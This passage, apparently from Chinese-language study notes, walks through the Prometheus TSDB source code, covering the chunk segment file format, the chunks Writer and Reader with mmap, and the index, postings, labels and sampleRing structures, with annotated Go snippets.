TSDB在磁盘上大致的目录结构之后，再来深入到segment文件中分析一下其存储格式。如图2-7所示，在创建segment文件时，首先会写入一个8字节的文件头，之后才会开始写入Chunk数据。在持久化一个Chunk的时候，会先写入该Chunk中时序数据所占的字节数，然后才写入该Chunk中记录的时序数据，最后计算该Chunk对应的CRC32循环校验码并写入到segment文件中。\n\n![img](https://pic1.zhimg.com/80/v2-177127f2b230e3c88913e7ee9785f7b8_hd.png)\n\n了解了Prometheus TSDB存储时序数据的目录结构和文件格式之后，下面正式开始分析chunks.Writer结构体，其核心字段如下所示：\n\n- **dirFile（\\*os.File类型）**：磁盘上存储时序数据的目录。\n- **files（[]\\*os.File类型）**：dirFile目录下存储时序数据的segment文件集合，其中只有最后一个segment文件是当前有效的，即当前可以写入数据数据的segment文件，之前的segment文件不可写。\n- **wbuf（\\*bufio.Writer类型）**：用于写文件的bufio.Writer，该Writer是带缓冲区的。\n- **n（int64类型）**：当前分段已经写入的字节数。\n- **crc32（hash.Hash类型）**：crc32校验码，每一个写入的Chunk都会生成一个校验码。\n- **segmentSize（int64类型）**：每个分段文件的大小上限，默认是512 * 1024 * 1024\n\nPrometheus TSDB通过NewWriter()函数创建Writer实例，其中同时还会创建存放segment文件的目录并赋予足够的操作权限，具体实现如下所示：\n\n```go\nfunc NewWriter(dir string) (*Writer, error) {\n // 创建dir参数指定的目录，并给予足够的权限(略)\n dirFile, err := fileutil.OpenDir(dir) // 打开该目录\n cw := &Writer{ // 初始化Writer实例\n dirFile: dirFile,\n n: 0,\n crc32: newCRC32(), // 创建复用的CRC32循环校验码\n segmentSize: defaultChunkSegmentSize,\n }\n return cw, nil\n}\n```\n\n完成Writer实例的初始化之后，就可以调用其WriteChunks()方法批量写入Chunk数据了。在该方法中，首先会根据此次写入的数据量以及当前segment文件的大小，决定是否要创建并切换到新的segment文件上完成此次写入，之后会按照前面介绍的segment文件的格式，逐个写入Chunk实例中的时序数据。WriteChunks()方法的具体实现如下所示：\n\n```go\nfunc (w *Writer) WriteChunks(chks ...Meta) error {\n maxLen := int64(binary.MaxVarintLen32) // 计算此次待写入的所有Chunk实例的字节总数\n for _, c := range chks {\n maxLen += binary.MaxVarintLen32 + 1 \n maxLen += int64(len(c.Chunk.Bytes()))\n }\n newsz := w.n + maxLen // 计算写入传入Chunk集合之后，当前segment文件所占的字节数\n\n // 如果满足下述三个条件中的任意一个，则会通过cut()方法新建segment文件，此次传入的Chunk集合\n // 将全部写入到新建segment文件中:\n // 1、该chunks.Writer实例第一次写入\n // 2、写入之前，当前segment文件大小已经达到切分的阈值\n // 3、如果将传入Chunk集合写入之后，当前segment文件大小已经达到切分的阈值\n if w.wbuf == nil || w.n > w.segmentSize || \n newsz > w.segmentSize && maxLen <= w.segmentSize {\n if err := w.cut(); ... // 省略错误处理的代码\n }\n\n var (\n b = [binary.MaxVarintLen32]byte{}\n // 将当前segment文件在Writer.files集合中的下标，记录到seq变量的高32位中\n seq = uint64(w.seq()) << 32 \n )\n for i := range chks { // 将Chunk逐个写入到当前segment文件中\n chk := &chks[i]\n // 更新Ref字段，其中高32位明确了该Chunk在哪个segment文件中，低32位记录了该Chunk\n // 在该segment文件中的字节偏移量。在后面介绍读取过程时，还会看到Ref字段的作用\n chk.Ref = seq | uint64(w.n)\n // 统计该Chunk的字节数，并记录到segment文件中\n n := binary.PutUvarint(b[:], uint64(len(chk.Chunk.Bytes())))\n if err := w.write(b[:n]); ...\n\n b[0] = byte(chk.Chunk.Encoding()) // 将Chunk的编码类型写入到segment文件中\n if err := w.write(b[:1]); ... // 省略错误处理的代码\n\n // 将Chunk中记录的时序数据写入到segment文件中\n if err := w.write(chk.Chunk.Bytes()); ... // 省略错误处理的代码\n  // 计算该Chunk的CRC32校验码并写入到segment文件中\n w.crc32.Reset()\n if err := chk.writeHash(w.crc32); ... // 省略错误处理的代码\n if err := w.write(w.crc32.Sum(b[:0])); ... // 省略错误处理的代码\n }\n return nil\n}\n```\n\n在WriteChunks()方法中我们看到，无论是首次写入还是达到segment文件大小上限值，都会调用cut()方法。在cut()方法中会按序完成下列操作，实现segment文件的切换：\n\n1. 调用finalizeTail()方法结束当前文件的写入。\n2. 获取新segment文件的名称，并创建对应的新segment文件。在新segment文件名的计算方式大致是：先获取当前目录下全部segment文件名并进行排序，正如前面在目录结构中介绍的那样，segment文件名中都是包含数字编号的，新segment文件名称就是当前最大的编号+1。该过程在nextSequenceFile()方法中实现，感兴趣的读者可以参考其代码进行学习，这里不再展开分析。\n3. 按照segmentSize字段指定的大小为新segment文件预分配空间。\n4. 向新segment文件写入8字节的文件头。\n5. 将新segment文件记录到Writer.files切片的末尾。\n\nWriter.cut()方法具体实现如下所示：\n\n```go\nfunc (w *Writer) cut() error {\n // 通过finalizeTail()方法完成当前文件的写入，其具体实现在后面详细介绍\n if err := w.finalizeTail(); ... \n p, _, err := nextSequenceFile(w.dirFile.Name()) // 计算下一个写入的新segment文件的名称\n\n f, err := os.OpenFile(p, os.O_WRONLY|os.O_CREATE, 0666) // 创建新segment文件\n // 按照segment文件大小的上限进行预分配\n if err = fileutil.Preallocate(f, w.segmentSize, true); ...\n if err = w.dirFile.Sync();... // 将上述segment文件创建以及预分配操作同步到磁盘\n\n metab := make([]byte, 8) // 创建文件头，共占8个字节\n binary.BigEndian.PutUint32(metab[:4], MagicChunks) // 前4个字节写入固定头信息\n metab[4] = chunksFormatV1 // 写入版本信息\n if _, err := f.Write(metab); ... // 将8字节文件头写入到segment文件中\n w.files = append(w.files, f) // 将新建的segment文件记录到Writer.files集合中\n if w.wbuf != nil {\n w.wbuf.Reset(f) // 将wbuf从上一个文件指向新建的文件\n } else { // 第一次写入时会初始化wbuf字段，其缓冲区为8M\n w.wbuf = bufio.NewWriterSize(f, 8*1024*1024)\n }\n w.n = 8 // 已写入文件头，占用8个字节\n return nil\n}\n```\n\nWriter.finalizeTail()方法主要完成了两件事，一是将已写入当前segment文件的时序数据刷新到磁盘中，二是对当前segment文件中预分配但是未使用的部分进行截断，最后关闭文件，其具体实现如下所示：\n\n```go\nfunc (w *Writer) finalizeTail() error {\n tf := w.tail() // 获取files集合中最后一个文件，即当前有效的写入文件\n // 调用wbuf字段(bufio.Writer)的Flush()方法将数据刷新到磁盘中(略)\n if err := w.wbuf.Flush();...// 省略异常处理的相关代码\n if err := fileutil.Fsync(tf);... // 省略异常处理的相关代码\n\n // 前面在创建文件时会进行预分配，这里获取当前写入的位置，并调用Truncate()方法进行截断，\n // 将该文件中off之后的预分配的内容删掉\n off, err := tf.Seek(0, io.SeekCurrent)\n if err := tf.Truncate(off);...\n return tf.Close() // 关闭当前文件\n}\n```\n\n到此为止，ChunkWriter接口及其具体实现的内容就全部介绍完了。\n\n### ChunkReader\n\n介绍完Prometheus TSDB持久化时序数据的相关实现之后，我们继续分析Prometheus TSDB如何将持久化的时序数据读取到内存中，并封装到相应的Chunk实例中。\n\n首先来看读取时序数据的核心接口——ChunkReader，该接口的Chunk()方法会根据ref参数读取对应的Chunk并返回，这里的ref参数就是前面在写入Chunk实例时为其填充的Ref字段。\n\n```go\ntype ChunkReader interface {\n Chunk(ref uint64) (chunkenc.Chunk, error) // 根据ref参数读取相应的Chunk实例\n Close() error // 关闭当前ChunkReader并释放所有资源\n}\n```\n\nPrometheus TSDB中有多个 ChunkReader接口的实现，如图2-8所示，本小节主要介绍的是其中chunks.Reader实现，剩余两个实现在后面涉及到时再做描述。\n\n![img](https://pic2.zhimg.com/80/v2-4b293fb68fc8c594597ff334ffa82985_hd.jpg)\n\n\n\nchunks.Reader结构体中的核心字段如下：\n\n- **bs（[]ByteSlice类型）**：ByteSlice接口是对byte切片的抽象，它提供了两个方法，一个是Len()方法，用于返回底层byte切片的长度，另一个方法是Range()方法，用于返回底层byte切片在指定区间内的数据。ByteSlice接口的实现是realByteSlice，realByteSlice则是[]byte的类型别名。bs字段存储的是时序数据，其中每个ByteSlice实例都对应一个segment文件的数据。\n- **cs（[]io.Closer类型）**：当前Reader实例能够读取的文件集合，其中每个元素都对应一个segment文件。\n- **pool（chunkenc.Pool类型）**：用于存储可重用的Chunk实例。\n\n在开始介绍chunks.Reader如何读取segment文件之前，我们先来简单介绍mmap相关的基础知识。\n\n**mmap简介**\n\n从Linux系统的角度来看，操作系统的内存空间被分为两大部分，分别是：内核空间、用户空间，其中“用户空间”和“内核空间”的空间大小、操作权限以及核心功能都是不尽相同。这里的“内核空间”是操作系统本身使用的内存空间，而“用户空间”则是提供给各个进程使用的内存空间。用户进程不具有访问内核资源的权限，例如访问硬件资源，因此一个用户进程需要使用内核资源的时候，就需要通过系统调用来完成。图2-9以读写磁盘文件为例，展示了用户进程进行系统调用的整个过程：\n\n1. 首先是读取文件的过程，用户进程发出read()系统调用之后，会完成从用户态到内核态的上下文切换。之后会通过DMA将文件中的数据从磁盘拷贝到内核空间的缓冲区中。\n2. 将内核空间缓冲区的数据拷贝到用户空间的缓冲区中，然后read()系统调用返回，此时会完成从内核态到用户态的上下文切换，整个读取文件的过程结束。\n3. 之后是写入文件的过程，用户进程发出write()系统调用之后，会完成用户态到内核态的上下文切换。将数据从用户空间缓冲区拷贝到内核空间缓冲区。\n4. 最后，write()系统调用返回，同时进程会从内核态切换到用户态。而数据则将从内核缓冲区写入磁盘。到此为止，整个写入文件的过程结束。\n\n![img](https://pic1.zhimg.com/80/v2-56ad08b8c2261392a38d8ca51ee9e150_hd.jpg)\n\n所以一次文件读取过程涉及两次数据拷贝以及两次上下文切换，同理，一次文件写入过程也会涉及两次数据拷贝以及两次上下文切换。\n\nmmap是操作系统提供的内存映射机制，它可以将磁盘上一个文件中的一部分映射到一个虚拟内存区域上，这样程序就可以像操作内存一样操作文件。mmap也是实现“零拷贝”的一种方式，其大致原理如下：\n\n1. 用户进程发出mmap()系统调用之后，会完成从用户态到内核态的上下文切换。然后通过DMA将磁盘文件中的数据拷贝到内核空间的缓冲区中。\n2. mmap()系统调用返回，用户进程会完成从内核态到用户态的上下文切换。接着用户空间和内核空间共享这个缓冲区，而不需要将其中的数据从内核空间拷贝到用户空间。因为用户空间和内核空间共享了这个缓冲区数据，所以用户空间就可以像在操作自己缓冲区中数据一般操作这个由内核空间共享的缓冲区。\n3. 在写入文件的时候，用户进程发出write()系统调用，用户进程从用户态切换到内核态，并向共享缓冲区中写入数据。\n4. 完成数据写入之后，write()系统调用返回，用户进程从内核态切换到用户态，同时会通过DMA将内核缓冲区中的数据刷新到磁盘中。\n\nmmap的工作原理如下图所示，其上下文切换的次数与前面介绍的传统I/O相同，在图2-10中也就没用展示，但是mmap进行内存拷贝的次数要比传统I/O的少：\n\n![img](https://pic1.zhimg.com/80/v2-86e040f86279bb591fbd347490849060_hd.jpg)\n\n了解了mmap的原理之后，我们继续回到chunks.Reader进行分析。首先来看其初始化过程，该过程由chunks.NewDirReader()函数完成，该函数首先会获取指定chunks目录下的所有segment文件名并进行排序，然后通过mmap系统调用将segment文件映射到虚拟内存中，之后校验每个segment文件的内容是否合法（即segment文件开头是否为固定的MagicChunks文件头），最后创建对应的Reader实例。NewDirReader()函数的具体实现如下所示：\n\n```go\nfunc NewDirReader(dir string, pool chunkenc.Pool) (*Reader, error) {\n // sequenceFiles()函数会读取指定chunks文件夹中的分段文件并按照文件名进行排序，这里不再展开\n // 介绍其具体实现，感兴趣的读者可以参考其源码进行学习\n files, err := sequenceFiles(dir) \n if pool == nil { // 初始化Chunk池\n pool = chunkenc.NewPool()\n }\n\n var bs []ByteSlice\n var cs []io.Closer\n for _, fn := range files {\n f, err := fileutil.OpenMmapFile(fn) // 通过mmap系统调用将当前整个segment文件映射到内存\n cs = append(cs, f) // 将映射得到的MmapFile实例追加到cs切片中\n bs = append(bs, realByteSlice(f.Bytes())) // 将segment文件映射到bs切片中\n }\n return newReader(bs, cs, pool) // 其中完成文件头的校验以及Reader实例的创建\n}\n下面再来看Reader.Chunk()方法，该方法会根据传入的ref参数在当前chunks目录中查找对应Chunk数据位置，然后从Chunk池中获取一个空闲Chunk实例，最后从文件中读取时序数据填充到Chunk实例中，并将其返回。Chunk()方法的具体实现如下所示：\nfunc (s *Reader) Chunk(ref uint64) (chunkenc.Chunk, error) {\n var (\n seq = int(ref >> 32) // 从ref参数的高32位中获取对应Chunk所在的segment文件编号\n // 从ref参数的低32位中获取Chunk在该segment文件中的字节偏移量\n  off = int((ref << 32) >> 32) \n )\n // 检测seq编号是否合法，即检测seq编号是否大于chunks目录中最大编号(略)\n b := s.bs[seq]\n // 查找到正确的segment文件之后，检测off偏移量是否合法，即检测off偏移量是否超过了\n // 该segment文件的大小(略)\n // 确定该Chunk所在的segment文件以及其在segment文件中的偏移量之后，下面会读取Chunk在文件\n // 中所占的字节数\n  r := b.Range(off, off+binary.MaxVarintLen32)\n l, n := binary.Uvarint(r)\n if n <= 0 {\n return nil, errors.Errorf(\"reading chunk length failed with %d\", n)\n }\n r = b.Range(off+n, off+n+int(l)) // 获取ref对应的时序数据\n // 从Chunk池中获取一个空闲的Chunk实例，并将Encoding方式以及时序数据填充进去\n return s.pool.Get(chunkenc.Encoding(r[0]), r[1:1+l])\n}\n```\n\n最后，Reader.Close()方法会关闭当前Reader实例底层涉及到的全部segment文件，其实现比较简单，这里不再展开分析，感兴趣的读者可以参考其代码进行学习。\n\n[fileutil](https://link.jianshu.com/?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Ffileutil) 提供了一些操作文件/目录的函数, 处理了不同平台 (主要是 win) 的兼容性问题.\n\n## index\n\n[index](https://link.jianshu.com?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Findex) 实现针对 labels 的索引.\n\n在 prometheus/tsdb 中, 认为 labels + timestamp + value 是一个完整的数据点\n\nchunks 相关的代码用于存储 timestamp + value, 而 index 则是对于 labels 的处理.\n\n##### encbuf, decbuf\n\n作为 buffer 在 index 数据编码/解码时进行 复用\n\n实际上这里也定义了一些数据格式如何进行存储\n\n```go\n// putVarintStr writes a string to the buffer prefixed by its varint length (in bytes!).\n// 对于字符串, 分别写入长度及字符串本身\nfunc (e *encbuf) putUvarintStr(s string) {\n    b := *(*[]byte)(unsafe.Pointer(&s))\n    e.putUvarint(len(b))\n    e.putString(s)\n}\n\n// 相应地, 在解码时也会先确定 str 长度, 再从整个 []byte 中取出必要的部分\nfunc (d *decbuf) uvarintStr() string {\n    l := d.uvarint64()\n    if d.e != nil {\n        return \"\"\n    }\n    if len(d.b) < int(l) {\n        d.e = errInvalidSize\n        return \"\"\n    }\n    s := string(d.b[:l])\n    d.b = d.b[l:]\n    return s\n}\n```\n\n##### indexWriterSeries\n\n```go\ntype indexWriterSeries struct {\n    // labels 的实际内容, 即 kv 对\n    labels labels.Labels\n    \n    // 这里重要的实际是 Meta.Ref, 即每个 chunk 对应的文件/起点\n    chunks []chunks.Meta // series file offset of chunks\n    \n    // 这里是 labels 数据在文件中的 offset\n    offset uint32        // index file offset of series reference\n}\n```\n\n##### indexTOC\n\nindex table of contents, 记录 index 不同类型数据的位置\n\n```go\ntype indexTOC struct {\n    symbols           uint64\n    series            uint64\n    labelIndices      uint64\n    labelIndicesTable uint64\n    postings          uint64\n    postingsTable     uint64\n}\n```\n\n##### Writer\n\n实现 [IndexWriter](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fblock.go%23L32-L58) , 基于文件的 index 存储\n\nindex 的文件格式要比 chunk 复杂的多, 可以参考 [Documentation/format/index.md](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2FDocumentation%2Fformat%2Findex.md)\n\n每个 index 文件的写入分为 5 个阶段, 顺序执行.\n\n```go\ntype indexWriterStage uint8\n\nconst (\n    idxStageNone indexWriterStage = iota\n    idxStageSymbols\n    idxStageSeries\n    idxStageLabelIndex\n    idxStagePostings\n    idxStageDone\n)\n\n// ensureStage handles transitions between write stages and ensures that IndexWriter\n// methods are called in an order valid for the implementation.\nfunc (w *Writer) ensureStage(s indexWriterStage) error {\n    if w.stage == s {\n        return nil\n    }\n    \n    // 排在当前阶段之前的, 不可再执行\n    if w.stage > s {\n        return errors.Errorf(\"invalid stage %q, currently at %q\", s, w.stage)\n    }\n\n    // Mark start of sections in table of contents.\n    switch s {\n    \n    // ...\n\n    // 执行到完成阶段时, 自动写入必要的辅助信息\n    case idxStageDone:\n        w.toc.labelIndicesTable = w.pos\n        if err := w.writeOffsetTable(w.labelIndexes); err != nil {\n            return err\n        }\n        w.toc.postingsTable = w.pos\n        if err := w.writeOffsetTable(w.postings); err != nil {\n            return err\n        }\n        if err := w.writeTOC(); err != nil {\n            return err\n        }\n    }\n\n    w.stage = s\n    return nil\n}\n```\n\n**AddSymbols**\n\n```go\nfunc (w *Writer) AddSymbols(sym map[string]struct{}) error {\n    if err := w.ensureStage(idxStageSymbols); err != nil {\n        return err\n    }\n    \n    // ...\n    \n    return errors.Wrap(err, \"write symbols\")\n}\n```\n\nlabel 中的每一个键或值都是一个 symbol.\n\n通过 \"使用对 symbol 的引用\" 的方式, 来缩减后续索引文件中的空间占用.\n\n**AddSeries**\n\n```go\nfunc (w *Writer) AddSeries(ref uint64, lset labels.Labels, chunks ...chunks.Meta) error {\n    if err := w.ensureStage(idxStageSeries); err != nil {\n        return err\n    }\n    if labels.Compare(lset, w.lastSeries) <= 0 {\n        return errors.Errorf(\"out-of-order series added with label set %q\", lset)\n    }\n\n    // 记录每个时间序列的位置\n    if _, ok := w.seriesOffsets[ref]; ok {\n        return errors.Errorf(\"series with reference %d already added\", ref)\n    }\n    w.seriesOffsets[ref] = w.pos\n\n    w.buf2.reset()\n    w.buf2.putUvarint(len(lset))\n\n    // 对于每个 label, 分别记录 它的 name 和 value 在索引文件中的位置\n    for _, l := range lset {\n        offset, ok := w.symbols[l.Name]\n        // ...\n\n        offset, ok = w.symbols[l.Value]\n        // ...\n    }\n\n    w.buf2.putUvarint(len(chunks))\n\n    // 对于 chunk 数据, 记录它覆盖的时间范围, 以及存储地址\n    // 除第一个 chunk 外, 其他记录的都是变化量\n    if len(chunks) > 0 {\n        c := chunks[0]\n        w.buf2.putVarint64(c.MinTime)\n        w.buf2.putUvarint64(uint64(c.MaxTime - c.MinTime))\n        w.buf2.putUvarint64(c.Ref)\n        t0 := c.MaxTime\n        ref0 := int64(c.Ref)\n\n        for _, c := range chunks[1:] {\n            w.buf2.putUvarint64(uint64(c.MinTime - t0))\n            w.buf2.putUvarint64(uint64(c.MaxTime - c.MinTime))\n            t0 = c.MaxTime\n\n            w.buf2.putVarint64(int64(c.Ref) - ref0)\n            ref0 = int64(c.Ref)\n        }\n    }\n\n    // ...\n\n    return nil\n}\n```\n\n**WriteLabelIndex**\n\n```go\n// 这里传入的参数可以认为是下述结构\n// 其中每一组 value 都是 names 的一组取值组合\n// type Label struct {\n//  names []string\n//  valus [][]string\n// }\nfunc (w *Writer) WriteLabelIndex(names []string, values []string) error {\n    if len(values)%len(names) != 0 {\n        return errors.Errorf(\"invalid value list length %d for %d names\", len(values), len(names))\n    }\n    if err := w.ensureStage(idxStageLabelIndex); err != nil {\n        return errors.Wrap(err, \"ensure stage\")\n    }\n\n    // ...\n\n    // 所有 hash entry 会统一在后续阶段写入\n    w.labelIndexes = append(w.labelIndexes, hashEntry{\n        keys:   names,\n        offset: w.pos,\n    })\n\n    // ...\n\n    // 对于每个 value, 都只写入引用值\n    for _, v := range valt.s {\n        offset, ok := w.symbols[v]\n        // ...\n    }\n\n    // ...\n\n    err = w.write(w.buf1.get(), w.buf2.get())\n    return errors.Wrap(err, \"write label index\")\n}\n```\n\n**WritePostings**\n\n```go\n// Postings 用来记录每一个 label (一对 name, value) 对应了哪些数据块, 用于检索\nfunc (w *Writer) WritePostings(name, value string, it Postings) error {\n    // ...\n    \n    // 每一对 name-value 对应的数据位置\n    w.postings = append(w.postings, hashEntry{\n        keys:   []string{name, value},\n        offset: w.pos,\n    })\n\n    // Order of the references in the postings list does not imply order\n    // of the series references within the persisted block they are mapped to.\n    // We have to sort the new references again.\n    refs := w.uint32s[:0]\n\n    for it.Next() {\n        offset, ok := w.seriesOffsets[it.At()]\n        \n        // ...\n        \n        refs = append(refs, uint32(offset))\n    }\n    if err := it.Err(); err != nil {\n        return err\n    }\n    sort.Sort(uint32slice(refs))\n\n    // ...\n\n    err := w.write(w.buf1.get(), w.buf2.get())\n    return errors.Wrap(err, \"write postings\")\n}\n```\n\n**Close**\n\n```go\nfunc (w *Writer) Close() error {\n    // 这里会自动执行 labelIndexes, postings, toc 的写入\n    if err := w.ensureStage(idxStageDone); err != nil {\n        return err\n    }\n    \n    // 文件落盘\n    if err := w.fbuf.Flush(); err != nil {\n        return err\n    }\n    if err := fileutil.Fsync(w.f); err != nil {\n        return err\n    }\n    return w.f.Close()\n}\n\n// writeOffsetTable writes a sequence of readable hash entries.\nfunc (w *Writer) writeOffsetTable(entries []hashEntry) error {\n    w.buf2.reset()\n    w.buf2.putBE32int(len(entries))\n\n    for _, e := range entries {\n        w.buf2.putUvarint(len(e.keys))\n        for _, k := range e.keys {\n            w.buf2.putUvarintStr(k)\n        }\n        w.buf2.putUvarint64(e.offset)\n    }\n\n    w.buf1.reset()\n    w.buf1.putBE32int(w.buf2.len())\n    w.buf2.putHash(w.crc32)\n\n    return w.write(w.buf1.get(), w.buf2.get())\n}\n\nfunc (w *Writer) writeTOC() error {\n    w.buf1.reset()\n\n    w.buf1.putBE64(w.toc.symbols)\n    w.buf1.putBE64(w.toc.series)\n    w.buf1.putBE64(w.toc.labelIndices)\n    w.buf1.putBE64(w.toc.labelIndicesTable)\n    w.buf1.putBE64(w.toc.postings)\n    w.buf1.putBE64(w.toc.postingsTable)\n\n    w.buf1.putHash(w.crc32)\n\n    return w.write(w.buf1.get())\n}\n```\n\n##### Reader\n\n实现了 [IndexReader](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fblock.go%23L61-L89)\n\n```go\nfunc newReader(b ByteSlice, c io.Closer) (*Reader, error) {\n    r := &Reader{\n        // ...\n    }\n    // Verify magic number.\n    \n    // ...\n\n    // toc 在文件尾部, 且长度固定, 因此可以直接读出\n    if err := r.readTOC(); err != nil {\n        return nil, errors.Wrap(err, \"read TOC\")\n    }\n    if err := r.readSymbols(int(r.toc.symbols)); err != nil {\n        return nil, errors.Wrap(err, \"read symbols\")\n    }\n    var err error\n\n    err = r.readOffsetTable(r.toc.labelIndicesTable, func(key []string, off uint32) error {\n        // 不知道这里为什么会强制长度为 1?\n        // 根据 Writer.WriteLabelIndex 的定义, 明显是支持多 names 的\n        // 实际验证, 多 names 写入没有问题, 但在读取的时候会在这里报错\n        // 等待后续看相关代码来理解吧.\n        if len(key) != 1 {\n            return errors.Errorf(\"unexpected key length %d\", len(key))\n        }\n        r.labels[key[0]] = off\n        return nil\n    })\n    if err != nil {\n        return nil, errors.Wrap(err, \"read label index table\")\n    }\n    err = r.readOffsetTable(r.toc.postingsTable, func(key []string, off uint32) error {\n        // ...\n        return nil\n    })\n    if err != nil {\n        return nil, errors.Wrap(err, \"read postings table\")\n    }\n\n    r.dec = &DecoderV1{symbols: r.symbols}\n\n    return r, nil\n}\n```\n\n##### Postings\n\nPosting 及其实现的具体作用, 待阅读剩余部分的代码后再回过头来确认.\n\n这是一个 Iterator.\n\n```go\n// Postings provides iterative access over a postings list.\ntype Postings interface {\n    // Next advances the iterator and returns true if another value was found.\n    Next() bool\n\n    // Seek advances the iterator to value v or greater and returns\n    // true if a value was found.\n    Seek(v uint64) bool\n\n    // At returns the value at the current iterator position.\n    At() uint64\n\n    // Err returns the last error of the iterator.\n    Err() error\n}\n```\n\n给出了 Posting 的交集, 并集, 以及差集实现\n\n```go\n// Intersect returns a new postings list over the intersection of the\n// input postings.\nfunc Intersect(its ...Postings) Postings {\n  if len(its) == 0 {\n      return emptyPostings\n  }\n  if len(its) == 1 {\n      return its[0]\n  }\n  l := len(its) / 2\n  return newIntersectPostings(Intersect(its[:l]...), Intersect(its[l:]...))\n}\n\ntype intersectPostings struct {\n  a, b     Postings\n  aok, bok bool\n  cur      uint64\n}\n\n\n// Merge returns a new iterator over the union of the input iterators.\nfunc Merge(its ...Postings) Postings {\n  if len(its) == 0 {\n      return EmptyPostings()\n  }\n  if len(its) == 1 {\n      return its[0]\n  }\n  l := len(its) / 2\n  return newMergedPostings(Merge(its[:l]...), Merge(its[l:]...))\n}\n\ntype mergedPostings struct {\n  a, b        Postings\n  initialized bool\n  aok, bok    bool\n  cur         uint64\n}\n\n// Without returns a new postings list that contains all elements from the full list that\n// are not in the drop list\nfunc Without(full, drop Postings) Postings {\n  return newRemovedPostings(full, drop)\n}\n\ntype removedPostings struct {\n  full, remove Postings\n\n  cur uint64\n\n  initialized bool\n  fok, rok    bool\n}\n```\n\n给出了几种特定类型的 Postings\n\n```go\n// EmptyPostings returns a postings list that's always empty.\nfunc EmptyPostings() Postings {\n  return emptyPostings\n}\n// ErrPostings returns new postings that immediately error.\nfunc ErrPostings(err error) Postings {\n  return errPostings{err}\n}\n\n// listPostings implements the Postings interface over a plain list.\ntype listPostings struct {\n  list []uint64\n  cur  uint64\n}\n\n// bigEndianPostings implements the Postings interface over a byte stream of\n// big endian numbers.\ntype bigEndianPostings struct {\n  list []byte\n  cur  uint32\n}\n```\n\n##### MemPostings\n\nlabel - posting idx 的映射记录器\n\n```go\n// MemPostings holds postings list for series ID per label pair. They may be written\n// to out of order.\n// ensureOrder() must be called once before any reads are done. This allows for quick\n// unordered batch fills on startup.\ntype MemPostings struct {\n    mtx     sync.RWMutex\n  \n    // label 和 posting id 的关联\n    m       map[labels.Label][]uint64\n  \n    // 成功执行 EnsureOrder 之后置为 true\n    ordered bool\n}\n```\n\n#### labels\n\n[labels](https://link.jianshu.com?t=https%3A%2F%2Fgodoc.org%2Fgithub.com%2Fprometheus%2Ftsdb%2Flabels) 是标签, 对应 influxdb 中的 tags, 即一组键值对.\n\n在 promethues/tsdb 中, timestamp 和 value 之外的所有信息都放在 labels 中\n\n这个 pkg 的核心就是 Label, Labels, 以及 Labels 的 Matcher\n\n```go\n// Label is a key/value pair of strings.\ntype Label struct {\n    Name, Value string\n}\n\n// Labels is a sorted set of labels. Order has to be guaranteed upon\n// instantiation.\ntype Labels []Label\n```\n\n在实际使用中, Labels 都应该是应该排序的. 因此 Labels 首先实现了 `sort.Interface`.\n\n同时, Labels 之间也是可以进行比较的\n\n```go\n// Compare compares the two label sets.\n// The result will be 0 if a==b, <0 if a < b, and >0 if a > b.\nfunc Compare(a, b Labels) int {\n    l := len(a)\n    if len(b) < l {\n        l = len(b)\n    }\n\n    // 逐个 label 比较 name, value 的字母序\n    for i := 0; i < l; i++ {\n        if d := strings.Compare(a[i].Name, b[i].Name); d != 0 {\n            return d\n        }\n        if d := strings.Compare(a[i].Value, b[i].Value); d != 0 {\n            return d\n        }\n    }\n    \n    // If all labels so far were in common, the set with fewer labels comes first.\n    // 可比较的部分无法确定顺序, 则比较两者长度\n    return len(a) - len(b)\n}\n```\n\n##### Slice\n\n`Slice` 是 `Labels` 的切片\n\n因为 `Labels` 可比较, 因此 `Slice` 也实现了 `sort.Interface`\n\n##### Matcher\n\n```go\n// Matcher specifies a constraint for the value of a label.\ntype Matcher interface {\n    // Name returns the label name the matcher should apply to.\n    Name() string\n    // Matches checks whether a value fulfills the constraints.\n    Matches(v string) bool\n}\n```\n\n`Matcher` 用来筛选 Labels\n\n这里提供了 equal, prefix, regexp, not 四种基本的 `Matcher`\n\n##### sampleRing\n\n```go\ntype sample struct {\n    t int64\n    v float64\n}\n\n// 既然是 Ring, 那么 buf 就是环装的, 因此有辅助的 i, f, l\ntype sampleRing struct {\n    delta int64\n\n    buf []sample // lookback buffer\n    i   int      // position of most recent element in ring buffer\n    f   int      // position of first element in ring buffer\n    l   int      // number of elements in buffer\n}\n```\n\nsampleRing 用来处理数据点的采样\n\n```go\n// add adds a sample to the ring buffer and frees all samples that fall\n// out of the delta range.\nfunc (r *sampleRing) add(t int64, v float64) {\n    l := len(r.buf)\n    // Grow the ring buffer if it fits no more elements.\n    if l == r.l {\n        // ring buffer 的扩容\n        buf := make([]sample, 2*l)\n        copy(buf[l+r.f:], r.buf[r.f:])\n        copy(buf, r.buf[:r.f])\n\n        r.buf = buf\n        r.i = r.f\n        r.f += l\n    } else {\n        r.i++\n        if r.i >= l {\n            r.i -= l\n        }\n    }\n\n    r.buf[r.i] = sample{t: t, v: v}\n    r.l++\n\n    // Free head of the buffer of samples that just fell out of the range.\n    // 这里认为 add 是有序的, 将头部所有早于 `t - r.delta` 的数据点移出有效区域\n    for r.buf[r.f].t < t-r.delta {\n        r.f++\n        if r.f >= l {\n            r.f -= l\n        }\n        r.l--\n    }\n}\n```\n\n##### sampleRingIterator\n\n```go\ntype sampleRingIterator struct {\n    r *sampleRing\n    i int\n}\n```\n\nsampleRingIterator 是 [SeriesIterator](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fquerier.go%23L668-L680) 的实现\n\n##### BufferedSeriesIterator\n\nBufferedSeriesIterator 同样也实现了 [SeriesIterator](https://link.jianshu.com?t=https%3A%2F%2Fgithub.com%2Fprometheus%2Ftsdb%2Fblob%2Fd45b595a1daefad23c09a2d994bf956f8b5f15a9%2Fquerier.go%23L668-L680), 它将一段部分数据点通过 sampleRing 